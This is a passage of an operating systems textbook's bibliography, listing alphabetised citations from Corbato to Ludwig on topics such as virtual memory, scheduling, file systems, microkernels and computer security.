CORBATO, F.J., and VYSSOTSKY, V.A.: “Introduction and Overview of the MULTICS System,” Proc. AFIPS Fall Joint Computer Conf., AFIPS, pp. 185-196, 1965.

CORBET, J., RUBINI, A., and KROAH-HARTMAN, G.: Linux Device Drivers, Sebastopol, CA: O’Reilly & Associates, 2009.

CORNWELL, M.: “Anatomy of a Solid-State Drive,” ACM Queue 10 10, pp. 30-37, 2012.
CORREIA, M., GOMEZ FERRO, D., JUNQUEIRA, F.P., and SERAFINI, M.: “Practical Hardening of Crash-Tolerant Systems,” Proc. USENIX Ann. Tech. Conf., USENIX, 2012.

COURTOIS, P.J., HEYMANS, F., and PARNAS, D.L.: “Concurrent Control with Readers and Writers,” Commun. of the ACM, vol. 10, pp. 667-668, Oct. 1971.

CROWLEY, C.: Operating Systems: A Design-Oriented Approach, Chicago: Irwin, 1997.
CUSUMANO, M.A., and SELBY, R.W.: “How Microsoft Builds Software,” Commun. of the ACM, vol. 40, pp. 53-61, June 1997.

DABEK, F., KAASHOEK, M.F., KARGET, D., MORRIS, R., and STOICA, I.: “Wide-Area Cooperative Storage with CFS,” Proc. 18th Symp. on Operating Systems Principles, ACM, pp. 202-215, 2001.

DAI, Y., QI, Y., REN, J., SHI, Y., WANG, X., and YU, X.: “A Lightweight VMM on Many Core for High Performance Computing,” Proc. Ninth Int’l Conf. on Virtual Execution Environments, ACM, pp. 111-120, 2013.

DALEY, R.C., and DENNIS, J.B.: “Virtual Memory, Process, and Sharing in MULTICS,” Commun. of the ACM, vol. 11, pp. 306-312, May 1968.

DASHTI, M., FEDOROVA, A., FUNSTON, J., GAUD, F., LACHAIZE, R., LEPERS, B., QUEMA, V., and ROTH, M.: “Traffic Management: A Holistic Approach to Memory Placement on NUMA Systems,” Proc. 18th Int’l Conf. on Arch. Support for Prog. Lang. and Operating Systems, ACM, pp. 381-394, 2013.

DAUGMAN, J.: “How Iris Recognition Works,” IEEE Trans. on Circuits and Systems for Video Tech., vol. 14, pp. 21-30, Jan. 2004.

DAWSON-HAGGERTY, S., KRIOUKOV, A., TANEJA, J., KARANDIKAR, S., FIERRO, G., and CULLER, D: “BOSS: Building Operating System Services,” Proc. 10th Symp. on Networked Systems Design and Implementation, USENIX, pp. 443-457, 2013.

DAYAN, N., SVENDSEN, M.K., BJORING, M., BONNET, P., and BOUGANIM, L.: “Eagle-Tree: Exploring the Design Space of SSD-based Algorithms,” Proc. VLDB Endowment, vol. 6, pp. 1290-1293, Aug. 2013.

DE BRUIJN, W., BOS, H., and BAL, H.: “Application-Tailored I/O with Streamline,” ACM Trans. on Computer Syst., vol. 29, number 2, pp.1-33, May 2011.

DE BRUIJN, W., and BOS, H.: “Beltway Buffers: Avoiding the OS Traffic Jam,” Proc. 27th Int’l Conf. on Computer Commun., April 2008.

DENNING, P.J.: “The Working Set Model for Program Behavior,” Commun. of the ACM, vol. 11, pp. 323-333, 1968a.

DENNING, P.J.: “Thrashing: Its Causes and Prevention,” Proc. AFIPS National Computer Conf., AFIPS, pp. 915-922, 1968b.

DENNING, P.J.: “Virtual Memory,” Computing Surveys, vol. 2, pp. 153-189, Sept. 1970.
DENNING, D.: Information Warfare and Security, Boston: Addison-Wesley, 1999.
DENNING, P.J.: “Working Sets Past and Present,” IEEE Trans. on Software Engineering, vol. SE-6, pp. 64-84, Jan. 1980.

DENNIS, J.B., and VAN HORN, E.C.: “Programming Semantics for Multiprogrammed Computations,” Commun. of the ACM, vol. 9, pp. 143-155, March 1966.

DIFFIE, W., and HELLMAN, M.E.: “New Directions in Cryptography,” IEEE Trans. on Information Theory, vol. IT-22, pp. 644-654, Nov. 1976.

DIJKSTRA, E.W.: “Co-operating Sequential Processes,” in Programming Languages, Genuys, F. (Ed.), London: Academic Press, 1965.

DIJKSTRA, E.W.: “The Structure of THE Multiprogramming System,” Commun. of the ACM, vol. 11, pp. 341-346, May 1968.

DUBOIS, M., SCHEURICH, C., and BRIGGS, F.A.: “Synchronization, Coherence, and Event Ordering in Multiprocessors,” Computer, vol. 21, pp. 9-21, Feb. 1988.

DUNN, A., LEE, M.Z., JANA, S., KIM, S., SILBERSTEIN, M., XU, Y., SHMATIKOV, V., and WITCHEL, E.: “Eternal Sunshine of the Spotless Machine: Protecting Privacy with Ephemeral Channels,” Proc. 10th Symp. on Operating Systems Design and Implementation, USENIX, pp. 61-75, 2012.

DUTTA, K., SINGH, V.K., and VANDERMEER, D.: “Estimating Operating System Process Energy Consumption in Real Time,” Proc. Eighth Int’l Conf. on Design Science at the Intersection of Physical and Virtual Design, Springer-Verlag, pp. 400-404, 2013.

EAGER, D.L., LAZOWSKA, E.D., and ZAHORJAN, J.: “Adaptive Load Sharing in Homogeneous Distributed Systems,” IEEE Trans. on Software Engineering, vol. SE-12, pp. 662-675, May 1986.

EDLER, J., LIPKIS, J., and SCHONBERG, E.: “Process Management for Highly Parallel UNIX Systems,” Proc. USENIX Workshop on UNIX and Supercomputers, USENIX, pp. 1-17, Sept. 1988.

EL FERKOUSS, O., SNAIKI, I., MOUNAOUAR, O., DAHMOUNI, H., BEN ALI, R., LEMIEUX, Y., and OMAR, C.: “A 100Gig Network Processor Platform for Openflow,” Proc. Seventh Int’l Conf. on Network Services and Management, IFIP, pp. 286-289, 2011.

EL GAMAL, A.: “A Public Key Cryptosystem and Signature Scheme Based on Discrete Logarithms,” IEEE Trans. on Information Theory, vol. IT-31, pp. 469-472, July 1985.

ELNABLY., A., and WANG, H.: “Efficient QoS for Multi-Tiered Storage Systems,” Proc. Fourth USENIX Workshop on Hot Topics in Storage and File Systems, USENIX, 2012.

ELPHINSTONE, K., KLEIN, G., DERRIN, P., ROSCOE, T., and HEISER, G.: “Towards a Practical, Verified, Kernel,” Proc. 11th Workshop on Hot Topics in Operating Systems, USENIX, pp. 117-122, 2007.

ENGLER, D.R., CHELF, B., CHOU, A., and HALLEM, S.: “Checking System Rules Using System-Specific Programmer-Written Compiler Extensions,” Proc. Fourth Symp. on Operating Systems Design and Implementation, USENIX, pp. 1-16, 2000.

ENGLER, D.R., KAASHOEK, M.F., and O’TOOLE, J. Jr.: “Exokernel: An Operating System Architecture for Application-Level Resource Management,” Proc. 15th Symp. on Operating Systems Principles, ACM, pp. 251-266, 1995.

ERL, T., PUTTINI, R., and MAHMOOD, Z.: “Cloud Computing: Concepts, Technology & Architecture,” Upper Saddle River, NJ: Prentice Hall, 2013.

EVEN, S.: Graph Algorithms, Potomac, MD: Computer Science Press, 1979.
FABRY, R.S.: “Capability-Based Addressing,” Commun. of the ACM, vol. 17, pp. 403-412, July 1974.

FANDRICH, M., AIKEN, M., HAWBLITZEL, C., HODSON, O., HUNT, G., LARUS, J.R., and LEVI, S.: “Language Support for Fast and Reliable Message-Based Communication in Singularity OS,” Proc. First European Conf. on Computer Systems (EUROSYS), ACM, pp. 177-190, 2006.

FEELEY, M.J., MORGAN, W.E., PIGHIN, F.H., KARLIN, A.R., LEVY, H.M., and THEKKATH, C.A.: “Implementing Global Memory Management in a Workstation Cluster,” Proc. 15th Symp. on Operating Systems Principles, ACM, pp. 201-212, 1995.

FELTEN, E.W., and HALDERMAN, J.A.: “Digital Rights Management, Spyware, and Security,” IEEE Security and Privacy, vol. 4, pp. 18-23, Jan./Feb. 2006.

FETZER, C., and KNAUTH, T.: “Energy-Aware Scheduling for Infrastructure Clouds,” Proc. Fourth Int’l Conf. on Cloud Computing Tech. and Science, IEEE, pp. 58-65, 2012.

FEUSTAL, E.A.: “The Rice Research Computer-A Tagged Architecture,” Proc. AFIPS Conf., AFIPS, 1972.

FLINN, J., and SATYANARAYANAN, M.: “Managing Battery Lifetime with Energy-Aware Adaptation,” ACM Trans. on Computer Systems, vol. 22, pp. 137-179, May 2004.

FLORENCIO, D., and HERLEY, C.: “A Large-Scale Study of Web Password Habits,” Proc. 16th Int’l Conf. on the World Wide Web, ACM, pp. 657-666, 2007.

FORD, R., and ALLEN, W.H.: “How Not To Be Seen,” IEEE Security and Privacy, vol. 5, pp. 67-69, Jan./Feb. 2007.

FOTHERINGHAM, J.: “Dynamic Storage Allocation in the Atlas Including an Automatic Use of a Backing Store,” Commun. of the ACM, vol. 4, pp. 435-436, Oct. 1961.

FRYER, D., SUN, K., MAHMOOD, R., CHENG, T., BENJAMIN, S., GOEL, A., and DEMKE BROWN, A.: “ReCon: Verifying File System Consistency at Runtime,” Proc. 10th USENIX Conf. on File and Storage Tech., USENIX, pp. 73-86, 2012.

FUKSIS, R., GREITANS, M., and PUDZS, M.: “Processing of Palm Print and Blood Vessel Images for Multimodal Biometrics,” Proc. COST1011 European Conf. on Biometrics and ID Mgt., Springer-Verlag, pp. 238-249, 2011.

FURBER, S.B., LESTER, D.R., PLANA, L.A., GARSIDE, J.D., PAINKRAS, E., TEMPLE, S., and BROWN, A.D.: “Overview of the SpiNNaker System Architecture,” Trans. on Computers, vol. 62, pp. 2454-2467, Dec. 2013.

FUSCO, J.: The Linux Programmer’s Toolbox, Upper Saddle River, NJ: Prentice Hall, 2007.
GARFINKEL, T., PFAFF, B., CHOW, J., ROSENBLUM, M., and BONEH, D.: “Terra: A Virtual Machine-Based Platform for Trusted Computing,” Proc. 19th Symp. on Operating Systems Principles, ACM, pp. 193-206, 2003.

GAROFALAKIS, J., and STERGIOU, E.: “An Analytical Model for the Performance Evaluation of Multistage Interconnection Networks with Two Class Priorities,” Future Generation Computer Systems, vol. 29, pp. 114-129, Jan. 2013.

GEER, D.: “For Programmers, Multicore Chips Mean Multiple Challenges,” Computer, vol. 40, pp. 17-19, Sept. 2007.

GEIST, R., and DANIEL, S.: “A Continuum of Disk Scheduling Algorithms,” ACM Trans. on Computer Systems, vol. 5, pp. 77-92, Feb. 1987.

GELERNTER, D.: “Generative Communication in Linda,” ACM Trans. on Programming Languages and Systems, vol. 7, pp. 80-112, Jan. 1985.

GHOSHAL, D., and PLALE, B: “Provenance from Log Files: a BigData Problem,” Proc. Joint EDBT/ICDT Workshops, ACM, pp. 290-297, 2013.

GIFFIN, D, LEVY, A., STEFAN, D., TEREI, D., MAZIERES, D.: “Hails: Protecting Data Privacy in Untrusted Web Applications,” Proc. 10th Symp. on Operating Systems Design and Implementation, USENIX, 2012.

GIUFFRIDA, C., KUIJSTEN, A., and TANENBAUM, A.S.: “Enhanced Operating System Security through Efficient and Fine-Grained Address Space Randomization,” Proc. 21st USENIX Security Symp., USENIX, 2012.

GIUFFRIDA, C., KUIJSTEN, A., and TANENBAUM, A.S.: “Safe and Automatic Live Update for Operating Systems,” Proc. 18th Int’l Conf. on Arch. Support for Prog. Lang. and Operating Systems, ACM, pp. 279-292, 2013.

GOLDBERG, R.P:: Architectural Principles for Virtual Computer Systems, Ph.D. thesis, Harvard University, Cambridge, MA, 1972.

GOLLMAN, D.: Computer Security, West Sussex, UK: John Wiley & Sons, 2011.
GONG, L.: Inside Java 2 Platform Security, Boston: Addison-Wesley, 1999.
GONZALEZ-FEREZ, P., PIERNAS, J., and CORTES, T.: “DADS: Dynamic and Automatic Disk Scheduling,” Proc. 27th Symp. on Appl. Computing, ACM, pp. 1759-1764, 2012.

GORDON, M.S., JAMSHIDI, D.A., MAHLKE, S., and MAO, Z.M.: “COMET: Code Offload by Migrating Execution Transparently,” Proc. 10th Symp. on Operating Systems Design and Implementation, USENIX, 2012.

GRAHAM, R.: “Use of High-Level Languages for System Programming,” Project MAC Report TM-13, M.I.T., Sept. 1970.

GROPP, W., LUSK, E., and SKJELLUM, A.: Using MPI: Portable Parallel Programming with the Message Passing Interface, Cambridge, MA: M.I.T. Press, 1994.

GUPTA, L.: “QoS in Interconnection of Next Generation Networks,” Proc. Fifth Int’l Conf. on Computational Intelligence and Commun. Networks, IEEE, pp. 91-96, 2013.

HAERTIG, H., HOHMUTH, M., LIEDTKE, J., and SCHONBERG, S.: “The Performance of Kernel-Based Systems,” Proc. 16th Symp. on Operating Systems Principles, ACM, pp. 66-77, 1997.

HAFNER, K., and MARKOFF, J.: Cyberpunk, New York: Simon and Schuster, 1991.
HAITJEMA, M.A.: Delivering Consistent Network Performance in Multi-Tenant Data Centers, Ph.D. thesis, Washington Univ., 2013.

HALDERMAN, J.A., and FELTEN, E.W.: “Lessons from the Sony CD DRM Episode,” Proc. 15th USENIX Security Symp., USENIX, pp. 77-92, 2006.

HAN, S., MARSHALL, S., CHUN, B.-G., and RATNASAMY, S.: “MegaPipe: A New Programming Interface for Scalable Network I/O,” Proc. USENIX Ann. Tech. Conf., USENIX, pp. 135-148, 2012.

HAND, S.M., WARFIELD, A., FRASER, K., KOTTSOVINOS, E., and MAGENHEIMER, D.: “Are Virtual Machine Monitors Microkernels Done Right?,” Proc. 10th Workshop on Hot Topics in Operating Systems, USENIX, pp. 1-6, 2005.

HARNIK, D., KAT, R., MARGALIT, O., SOTNIKOV, D., and TRAEGER, A.: “To Zip or Not to Zip: Effective Resource Usage for Real-Time Compression,” Proc. 11th USENIX Conf. on File and Storage Tech., USENIX, pp. 229-241, 2013.

HARRISON, M.A., RUZZO, W.L., and ULLMAN, J.D.: “Protection in Operating Systems,” Commun. of the ACM, vol. 19, pp. 461-471, Aug. 1976.

HART, J.M.: Win32 System Programming, Boston: Addison-Wesley, 1997.
HARTER, T., DRAGGA, C., VAUGHN, M., ARPACI-DUSSEAU, A.C., and ARPACIDUSSEAU, R.H.: “A File Is Not a File: Understanding the I/O Behavior of Apple Desktop Applications,” ACM Trans. on Computer Systems, vol. 30, Art. 10, pp. 71-83, Aug. 2012.

HAUSER, C., JACOBI, C., THEIMER, M., WELCH, B., and WEISER, M.: “Using Threads in Interactive Systems: A Case Study,” Proc. 14th Symp. on Operating Systems Principles, ACM, pp. 94-105, 1993.

HAVENDER, J.W.: “Avoiding Deadlock in Multitasking Systems,” IBM Systems J., vol. 7, pp. 74-84, 1968.

HEISER, G., UHLIG, V., and LEVASSEUR, J.: “Are Virtual Machine Monitors Microkernels Done Right?” ACM SIGOPS Operating Systems Rev., vol. 40, pp. 95-99, 2006.

HEMKUMAR, D., and VINAYKUMAR, K.: “Aggregate TCP Congestion Management for Internet QoS,” Proc. 2012 Int’l Conf. on Computing Sciences, IEEE, pp. 375-378, 2012.

HERDER, J.N., BOS, H., GRAS, B., HOMBURG, P., and TANENBAUM, A.S.: “Construction of a Highly Dependable Operating System,” Proc. Sixth European Dependable Computing Conf., pp. 3-12, 2006.

HERDER, J.N., MOOLENBROEK, D. VAN, APPUSWAMY, R., WU, B., GRAS, B., and TANENBAUM, A.S.: “Dealing with Driver Failures in the Storage Stack ,” Proc. Fourth Latin American Symp. on Dependable Computing, pp. 119-126, 2009.

HEWAGE, K., and VOIGT, T.: “Towards TCP Communication with the Low Power Wireless Bus,” Proc. 11th Conf. on Embedded Networked Sensor Systems, ACM, Art. 53, 2013.

HILBRICH, T. DE SUPINSKI, R., NAGEL, W., PROTZE, J., BAIER,. C., and MULLER, M.: “Distributed Wait State Tracking for Runtime MPI Deadlock Detection,” Proc. 2013 Int’l Conf. for High Performance Computing, Networking, Storage and Analysis, ACM, New York, NY, USA, 2013.

HILDEBRAND, D.: “An Architectural Overview of QNX,” Proc. Workshop on Microkernels and Other Kernel Arch., ACM, pp. 113-136, 1992.

HIPSON, P.: Mastering Windows XP Registry, New York: Sybex, 2002.
HOARE, C.A.R.: “Monitors, An Operating System Structuring Concept,” Commun. of the ACM, vol. 17, pp. 549-557, Oct. 1974; Erratum in Commun. of the ACM, vol. 18, p. 95, Feb. 1975.

HOCKING, M: “Feature: Thin Client Security in the Cloud,” J. Network Security, vol. 2011, pp. 17-19, June 2011.

HOHMUTH, M., PETER, M., HAERTIG, H., and SHAPIRO, J.: “Reducing TCB Size by Using Untrusted Components: Small Kernels Versus Virtual-Machine Monitors,” Proc. 11th ACM SIGOPS European Workshop, ACM, Art. 22, 2004.

HOLMBACKA, S., AGREN, D., LAFOND, S., and LILIUS, J.: “QoS Manager for Energy Efficient Many-Core Operating Systems,” Proc. 21st Euromicro Int’l Conf. on Parallel, Distributed, and Network-based Processing, IEEE, pp. 318-322, 2013.

HOLT, R.C.: “Some Deadlock Properties of Computer Systems,” Computing Surveys, vol. 4, pp. 179-196, Sept. 1972.

HOQUE, M.A., SIEKKINEN, and NURMINEN, J.K.: “TCP Receive Buffer Aware Wireless Multimedia Streaming: An Energy Efficient Approach,” Proc. 23rd Workshop on Network and Operating System Support for Audio and Video, ACM, pp. 13-18, 2013.

HOWARD, M., and LEBLANK, D.: Writing Secure Code, Redmond, WA: Microsoft Press, 2009.

HRUBY, T., VOGT, D., BOS, H., and TANENBAUM, A.S.: “Keep Net Working-On a Dependable and Fast Networking Stack,” Proc. 42nd Conf. on Dependable Systems and Networks, IEEE, pp. 1-12, 2012.

HUND, R. WILLEMS, C. AND HOLZ, T.: “Practical Timing Side Channel Attacks against Kernel Space ASLR,” Proc. IEEE Symp. on Security and Privacy, IEEE, pp. 191-205, 2013.

HRUBY, T., D., BOS, H., and TANENBAUM, A.S.: “When Slower Is Faster: On Heterogeneous Multicores for Reliable Systems,” Proc. USENIX Ann. Tech. Conf., USENIX, 2013.

HUA, J., LI, M., SAKURAI, K., and REN, Y.: “Efficient Intrusion Detection Based on Static Analysis and Stack Walks,” Proc. Fourth Int’l Workshop on Security, Springer-Verlag, pp. 158-173, 2009.

HUTCHINSON, N.C., MANLEY, S., FEDERWISCH, M., HARRIS, G., HITZ, D., KLEIMAN, S., and O’MALLEY, S.: “Logical vs. Physical File System Backup,” Proc. Third Symp. on Operating Systems Design and Implementation, USENIX, pp. 239-249, 1999.

IEEE: Information Technology-Portable Operating System Interface (POSIX), Part 1 : System Application Program Interface (API) [C Language], New York: Institute of Electrical and Electronics Engineers, 1990.

INTEL: “PCI-SIG SR-IOV Primer: An Introduction to SR-IOV Technology,” Intel White Paper, 2011.

ION, F.: “From Touch Displays to the Surface: A Brief History of Touchscreen Technology,” ArsTechnica, History of Tech, April, 2013

ISLOOR, S.S., and MARSLAND, T.A.: “The Deadlock Problem: An Overview,” Computer, vol. 13, pp. 58-78, Sept. 1980.

IVENS, K.: Optimizing the Windows Registry, Hoboken, NJ: John Wiley & Sons, 1998.

JANTZ, M.R., STRICKLAND, C., KUMAR, K., DIMITROV, M., and DOSHI, K.A.: “A Framework for Application Guidance in Virtual Memory Systems,” Proc. Ninth Int’l Conf. on Virtual Execution Environments, ACM, pp. 155-166, 2013.
JEONG, J., KIM, H., HWANG, J., LEE, J., and MAENG, S.: “Rigorous Rental Memory Management for Embedded Systems,” ACM Trans. on Embedded Computing Systems, vol. 12, Art. 43, pp. 1-21, March 2013.
JIANG, X., and XU, D.: “Profiling Self-Propagating Worms via Behavioral Footprinting,” Proc. Fourth ACM Workshop in Recurring Malcode, ACM, pp. 17-24, 2006.
JIN, H., LING, X., IBRAHIM, S., CAO, W., WU, S., and ANTONIU, G.: “Flubber: Two-Level Disk Scheduling in Virtualized Environment,” Future Generation Computer Systems, vol. 29, pp. 2222-2238, Oct. 2013.
JOHNSON, E.A: “Touch Display-A Novel Input/Output Device for Computers,” Electronics Letters, vol. 1, no. 8, pp. 219-220, 1965.
JOHNSON, N.F., and JAJODIA, S.: “Exploring Steganography: Seeing the Unseen,” Computer, vol. 31, pp. 26-34, Feb. 1998.
JOO, Y.: “F2FS: A New File System Designed for Flash Storage in Mobile Devices,” Embedded Linux Europe, Barcelona, Spain, November 2012.
JULA, H., TOZUN, P., and CANDEA, G.: “Communix: A Framework for Collaborative Deadlock Immunity,” Proc. IEEE/IFIP 41st Int. Conf. on Dependable Systems and Networks, IEEE, pp. 181-188, 2011.
KABRI, K., and SERET, D.: “An Evaluation of the Cost and Energy Consumption of Security Protocols in WSNs,” Proc. Third Int’l Conf. on Sensor Tech. and Applications, IEEE, pp. 49-54, 2009.
KAMAN, S., SWETHA, K., AKRAM, S., and VARAPRASAS, G.: “Remote User Authentication Using a Voice Authentication System,” Inf. Security J., vol. 22, pp. 117-125, Issue 3, 2013.
KAMINSKY, D.: “Explorations in Namespace: White-Hat Hacking across the Domain Name System,” Commun. of the ACM, vol. 49, pp. 62-69, June 2006.
KAMINSKY, M., SAVVIDES, G., MAZIERES, D., and KAASHOEK, M.F.: “Decentralized User Authentication in a Global File System,” Proc. 19th Symp. on Operating Systems Principles, ACM, pp. 60-73, 2003.
KANETKAR, Y.P.: Writing Windows Device Drivers Course Notes, New Delhi: BPB Publications, 2008.
KANT, K., and MOHAPATRA, P.: “Internet Data Centers,” IEEE Computer vol. 37, pp. 35-37, Nov. 2004.
KAPRITSOS, M., WANG, Y., QUEMA, V., CLEMENT, A., ALVISI, L., and DAHLIN, M.: “All about Eve: Execute-Verify Replication for Multi-Core Servers,” Proc. 10th Symp. on Operating Systems Design and Implementation, USENIX, pp. 237-250, 2012.
KASIKCI, B., ZAMFIR, C. and CANDEA, G.: “Data Races vs. Data Race Bugs: Telling the Difference with Portend,” Proc. 17th Int’l Conf. on Arch. Support for Prog. Lang. and Operating Systems, ACM, pp. 185-198, 2012.

KATO, S., ISHIKAWA, Y., and RAJKUMAR, R.: “Memory Management for Interactive Real-Time Applications,” Real-Time Systems, vol. 47, pp. 498-517, May 2011.

KAUFMAN, C., PERLMAN, R., and SPECINER, M.: Network Security, 2nd ed., Upper Saddle River, NJ: Prentice Hall, 2002.

KELEHER, P., COX, A., DWARKADAS, S., and ZWAENEPOEL, W.: “TreadMarks: Distributed Shared Memory on Standard Workstations and Operating Systems,” Proc. USENIX Winter Conf., USENIX, pp. 115-132, 1994.

KERNIGHAN, B.W., and PIKE, R.: The UNIX Programming Environment, Upper Saddle River, NJ: Prentice Hall, 1984.

KIM, J., LEE, J., CHOI, J., LEE, D., and NOH, S.H.: “Improving SSD Reliability with RAID via Elastic Striping and Anywhere Parity,” Proc. 43rd Int’l Conf. on Dependable Systems and Networks, IEEE, pp. 1-12, 2013.

KIRSCH, C.M., SANVIDO, M.A.A., and HENZINGER, T.A.: “A Programmable Microkernel for Real-Time Systems,” Proc. First Int’l Conf. on Virtual Execution Environments, ACM, pp. 35-45, 2005.

KLEIMAN, S.R.: “Vnodes: An Architecture for Multiple File System Types in Sun UNIX,” Proc. USENIX Summer Conf., USENIX, pp. 238-247, 1986.

KLEIN, G., ELPHINSTONE, K., HEISER, G., ANDRONICK, J., COCK, D., DERRIN, P., ELKADUWE, D., ENGELHARDT, K., KOLANSKI, R., NORRISH, M., SEWELL, T., TUCH, H., and WINWOOD, S.: “seL4: Formal Verification of an OS Kernel,” Proc. 22nd Symp. on Operating Systems Primciples, ACM, pp. 207-220, 2009.

KNUTH, D.E.: The Art of Computer Programming, Vol. Boston: Addison-Wesley, 1997.
KOLLER, R., MARMOL, L., RANGASWAMI, R, SUNDARARAMAN, S., TALAGALA, N., and ZHAO, M.: “Write Policies for Host-side Flash Caches,” Proc. 11th USENIX Conf. on File and Storage Tech., USENIX, pp. 45-58, 2013.

KOUFATY, D., REDDY, D., and HAHN, S.: “Bias Scheduling in Heterogeneous Multi-Core Architectures,” Proc. Fifth European Conf. on Computer Systems (EUROSYS), ACM, pp. 125-138, 2010.

KRATZER, C., DITTMANN, J., LANG, A., and KUHNE, T.: “WLAN Steganography: A First Practical Review,” Proc. Eighth Workshop on Multimedia and Security, ACM, pp. 17-22, 2006.

KRAVETS, R., and KRISHNAN, P.: “Power Management Techniques for Mobile Communication,” Proc. Fourth ACM/IEEE Int’l Conf. on Mobile Computing and Networking, ACM/IEEE, pp. 157-168, 1998.

KRISH, K.R., WANG, G., BHATTACHARJEE, P., BUTT, A.R., and SNIADY, C.: “On Reducing Energy Management Delays in Disks,” J. Parallel and Distributed Computing, vol. 73, pp. 823-835, June 2013.

KRUEGER, P., LAI, T.-H., and DIXIT-RADIYA, V.A.: “Job Scheduling Is More Important Than Processor Allocation for Hypercube Computers,” IEEE Trans. on Parallel and Distr. Systems, vol. 5, pp. 488-497, May 1994.

KUMAR, R., TULLSEN, D.M., JOUPPI, N.P., and RANGANATHAN, P.: “Heterogeneous Chip Multiprocessors,” Computer, vol. 38, pp. 32-38, Nov. 2005.

KUMAR, V.P., and REDDY, S.M.: “Augmented Shuffle-Exchange Multistage Interconnection Networks,” Computer, vol. 20, pp. 30-40, June 1987.

KWOK, Y.-K., AHMAD, I.: “Static Scheduling Algorithms for Allocating Directed Task Graphs to Multiprocessors,” Computing Surveys, vol. 31, pp. 406-471, Dec. 1999.

LACHAIZE, R., LEPERS, B., and QUEMA, V.: “MemProf: A Memory Profiler for NUMA Multicore Systems,” Proc. USENIX Ann. Tech. Conf., USENIX, 2012.

LAI, W.K., and TANG, C.-L.: “QoS-aware Downlink Packet Scheduling for LTE Networks,” Computer Networks, vol. 57, pp. 1689-1698, May 2013.

LAMPSON, B.W.: “A Note on the Confinement Problem,” Commun. of the ACM, vol. 10, pp. 613-615, Oct. 1973.

LAMPORT, L.: “Password Authentication with Insecure Communication,” Commun. of the ACM, vol. 24, pp. 770-772, Nov. 1981.

LAMPSON, B.W.: “Hints for Computer System Design,” IEEE Software, vol. 1, pp. 11-28, Jan. 1984.

LAMPSON, B.W., and STURGIS, H.E.: “Crash Recovery in a Distributed Data Storage System,” Xerox Palo Alto Research Center Technical Report, June 1979.

LANDWEHR, C.E.: “Formal Models of Computer Security,” Computing Surveys, vol. 13, pp. 247-278, Sept. 1981.

LANKES, S., REBLE, P., SINNEN, O., and CLAUSS, C.: “Revisiting Shared Virtual Memory Systems for Non-Coherent Memory-Coupled Cores,” Proc. 2012 Int’l Workshop on Programming Models for Applications for Multicores and Manycores, ACM, pp. 45-54, 2012.

LEE, Y., JUNG, T., and SHIN, I.L “Demand-Based Flash Translation Layer Considering Spatial Locality,” Proc. 28th Annual Symp. on Applied Computing, ACM, pp. 1550-1551, 2013.

LEVENTHAL, A.D.: “A File System All Its Own,” Commun. of the ACM, vol. 56, pp. 64-67, May 2013.

LEVIN, R., COHEN, E.S., CORWIN, W.M., POLLACK, FJ., and WULF, W.A.: “Policy/Mechanism Separation in Hydra,” Proc. Fifth Symp. on Operating Systems Principles, ACM, pp. 132-140, 1975.

LEVINE, G.N.: “Defining Deadlock,” ACM SIGOPS Operating Systems Rev., vol. 37, pp. 54-64, Jan. 2003.

LEVINE, J.G., GRIZZARD, J.B., and OWEN, H.L.: “Detecting and Categorizing Kernel-Level Rootkits to Aid Future Detection,” IEEE Security and Privacy, vol. 4, pp. 24-32, Jan./Feb. 2006.

LI, D., JIN, H., LIAO, X., ZHANG, Y., and ZHOU, B.: “Improving Disk I/O Performance in a Virtualized System,” J. Computer and Syst. Sci., vol. 79, pp. 187-200, March 2013a.

LI, D., LIAO, X., JIN, H., ZHOU, B., and ZHANG, Q.: “A New Disk I/O Model of Virtualized Cloud Environment,” IEEE Trans. on Parallel and Distributed Systems, vol. 24, pp. 1129-1138, June 2013b.

LI, K.: Shared Virtual Memory on Loosely Coupled Multiprocessors, Ph.D. Thesis, Yale Univ., 1986.

LI, K., and HUDAK, P.: “Memory Coherence in Shared Virtual Memory Systems,” ACM Trans. on Computer Systems, vol. 7, pp. 321-359, Nov. 1989.

LI, K., KUMPF, R., HORTON, P., and ANDERSON, T.: “A Quantitative Analysis of Disk Drive Power Management in Portable Computers,” Proc. USENIX Winter Conf., USENIX, pp. 279-291, 1994.

LI, Y., SHOTRE, S., OHARA, Y., KROEGER, T.M., MILLER, E.L., and LONG, D.D.E.: “Horus: Fine-Grained Encryption-Based Security for Large-Scale Storage,” Proc. 11th USENIX Conf. on File and Storage Tech., USENIX, pp. 147-160, 2013c.

LIEDTKE, J.: “Improving IPC by Kernel Design,” Proc. 14th Symp. on Operating Systems Principles, ACM, pp. 175-188, 1993.

LIEDTKE, J.: “On Micro-Kernel Construction,” Proc. 15th Symp. on Operating Systems Principles, ACM, pp. 237-250, 1995.

LIEDTKE, J.: “Toward Real Microkernels,” Commun. of the ACM, vol. 39, pp. 70-77, Sept. 1996.

LING, X., JIN, H., IBRAHIM, S., CAO, W., and WU, S.: “Efficient Disk I/O Scheduling with QoS Guarantee for Xen-based Hosting Platforms,” Proc. 12th Int’l Symp. on Cluster, Cloud, and Grid Computing, IEEE/ACM, pp. 81-89, 2012.

LIONS, J.: Lions’ Commentary on Unix 6th Edition, with Source Code, San Jose, CA: Peerto-Peer Communications, 1996.

LIU, T., CURTSINGER, C., and BERGER, E.D.: “Dthreads: Efficient Deterministic Multithreading,” Proc. 23rd Symp. of Operating Systems Principles, ACM, pp. 327-336, 2011.

LIU, Y., MUPPALA, J.K., VEERARAGHAVAN, M., LIN, D., and HAMDI, M.: Data Center Networks: Topologies, Architectures and Fault-Tolerance Characteristics, Springer, 2013.

LO, V.M.: “Heuristic Algorithms for Task Assignment in Distributed Systems,” Proc. Fourth Int’l Conf. on Distributed Computing Systems, IEEE, pp. 30-39, 1984.

LORCH, J.R., PARNO, B., MICKENS, J., RAYKOVA, M., and SCHIFFMAN, J.: “Shroud: Ensuring Private Access to Large-Scale Data in the Data Center,” Proc. 11th USENIX Conf. on File and Storage Tech., USENIX, pp. 199-213, 2013.

LOPEZ-ORTIZ, A., SALINGER, A.: “Paging for Multi-Core Shared Caches,” Proc. Innovations in Theoretical Computer Science, ACM, pp. 113-127, 2012.

LORCH, J.R., and SMITH, A.J.: “Apple Macintosh’s Energy Consumption,” IEEE Micro, vol. 18, pp. 54-63, Nov./Dec. 1998.

LOVE, R.: Linux System Programming: Talking Directly to the Kernel and C Library, Sebastopol, CA: O’Reilly & Associates, 2013.

LU, L., ARPACI-DUSSEAU, A.C., and ARPACI-DUSSEAU, R.H.: “Fault Isolation and Quick Recovery in Isolation File Systems,” Proc. Fifth USENIX Workshop on Hot Topics in Storage and File Systems, USENIX, 2013.
LUDWIG, M.A.: The Little Black Book of Email Viruses, Show Low, AZ: American Eagle Publications, 2002.
